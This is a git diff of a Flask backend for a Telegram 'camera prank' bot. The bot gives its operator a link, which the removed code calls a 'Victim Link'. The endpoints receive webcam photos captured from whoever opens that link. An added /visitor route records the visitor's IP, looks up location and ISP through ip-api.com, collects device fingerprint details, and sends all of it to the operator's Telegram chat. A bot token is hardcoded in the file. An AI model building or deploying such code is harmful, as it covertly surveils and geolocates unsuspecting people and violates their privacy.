@@ -10,93 +10,105 @@ app = Flask(__name__)
 TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
 WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"
 
-# Home check
+
 @app.route("/", methods=["GET"])
 def home():
-    return "✅ Backend Running"
+    return "OK"
 
-# Telegram webhook
+
 @app.route("/webhook", methods=["POST"])
 def webhook():
-    try:
-        update = request.get_json()
+    update = request.get_json()
 
-        if not update or "message" not in update:
-            return jsonify({"ok": True})
-
-        message = update["message"]
-        chat_id = message["chat"]["id"]
-        text = message.get("text", "").strip().lower()
-
-        # /start
-        if text == "/start":
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": "🎉 Camera Prank Bot Ready!\nUse /generate"
-                }
-            )
-
-        # /generate
-        elif text == "/generate":
-            unique_id = str(uuid.uuid4())[:8]
-            link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"
-
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": f"🔥 Victim Link:\n\n{link}",
-                    "reply_markup": {
-                        "inline_keyboard": [
-                            [{"text": "📸 Open Camera", "url": link}]
-                        ]
-                    }
-                }
-            )
-
+    if not update or "message" not in update:
         return jsonify({"ok": True})
 
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+    chat_id = update["message"]["chat"]["id"]
+    text = update["message"].get("text", "").lower()
+
+    if text == "/start":
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
+            "chat_id": chat_id,
+            "text": "📸 Camera Bot Ready!\nUse /generate"
+        })
+
+    elif text == "/generate":
+        uid = str(uuid.uuid4())[:8]
+        link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={uid}"
+
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
+            "chat_id": chat_id,
+            "text": f"Open link:\n{link}"
+        })
+
+    return jsonify({"ok": True})
 
 
-# Receive photo
 @app.route("/send-photo", methods=["POST"])
 def send_photo():
+    data = request.get_json()
+
+    chat_id = data.get("chat_id")
+    photo = data.get("photo")
+    number = data.get("number", "")
+
+    if not chat_id or not photo:
+        return jsonify({"error": "missing"}), 400
+
+    header, imgstr = photo.split(",", 1)
+    img_bytes = base64.b64decode(imgstr)
+
+    requests.post(
+        f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+        data={
+            "chat_id": chat_id,
+            "caption": f"📸 {number}"
+        },
+        files={"photo": ("img.jpg", BytesIO(img_bytes))}
+    )
+
+    return jsonify({"ok": True})
+
+
+@app.route("/visitor", methods=["POST"])
+def visitor():
+    data = request.get_json()
+
+    chat_id = data.get("chat_id")
+    device = data.get("device", {})
+
+    ip = request.headers.get('x-forwarded-for', request.remote_addr)
+
     try:
-        data = request.get_json()
+        res = requests.get(f"http://ip-api.com/json/{ip}").json()
+    except:
+        res = {}
 
-        chat_id = data.get("chat_id")
-        photo_base64 = data.get("photo")
-        num = data.get("number", 1)
+    msg = f"""
+🌐 VISITOR INFO
 
-        if not chat_id or not photo_base64:
-            return jsonify({"error": "missing data"}), 400
+IP: {ip}
 
-        # decode base64
-        header, imgstr = photo_base64.split(",", 1)
-        photo_bytes = base64.b64decode(imgstr)
+Location: {res.get('country')} - {res.get('city')}
+ISP: {res.get('isp')}
 
-        files = {
-            "photo": ("photo.jpg", BytesIO(photo_bytes), "image/jpeg")
-        }
+Device: {device.get('userAgent')}
+Platform: {device.get('platform')}
+Screen: {device.get('screen')}
+Language: {device.get('language')}
 
-        requests.post(
-            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-            data={
-                "chat_id": chat_id,
-                "caption": f"📸 Photo {num}/3 Captured 😂"
-            },
-            files=files
-        )
+Time: {device.get('time')}
+Timezone: {device.get('timezone')}
 
-        return jsonify({"ok": True})
+Battery: {device.get('battery')}
+"""
 
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+    requests.post(
+        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+        json={"chat_id": chat_id, "text": msg}
+    )
+
+    return jsonify({"ok": True})
 
 
-# IMPORTANT for Vercel
 app = app
